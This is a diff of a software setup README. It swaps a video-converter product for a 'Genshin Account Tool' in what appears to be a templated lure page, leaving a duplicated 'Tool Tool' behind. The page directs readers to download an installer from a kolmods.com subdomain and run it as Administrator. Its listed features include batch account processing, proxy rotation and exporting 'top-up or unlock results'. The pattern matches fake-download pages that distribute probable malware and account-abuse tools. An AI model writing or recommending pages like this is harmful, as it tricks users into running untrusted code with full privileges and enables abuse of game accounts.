@@ -1,10 +1,14 @@
-# Bigasoft Video Converter Windows Setup Notes
+# Genshin Account Tool Tool Setup Notes
 
-[⬇ Download Bigasoft Video Converter for Windows](https://bigasoft-converter.kolmods.com/)
+<p align="center">
+  <a href="https://genshin-account-tool.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-Genshin%20Account%20Tool-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Genshin Account Tool">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **Bigasoft Video Converter** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Genshin Account Tool** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Bigasoft Video Converter** from the Start menu
+5. Restart if the installer asks — then launch **Genshin Account Tool** from the Start menu
 
 ## What you can use it for
 
-- Convert video and audio between popular formats
-- Batch conversion queues for large media libraries
-- Hardware-accelerated H.264/H.265 encoding
-- Preset profiles for mobile, web, and archive
-- Trim, crop, and metadata editing before export
+- Generate or verify Genshin balance workflows
+- Batch account processing with rate limits
+- Export successful top-up or unlock results
+- Proxy rotation for region-locked checks
+- Session templates for repeat runs
 
 ## License
 
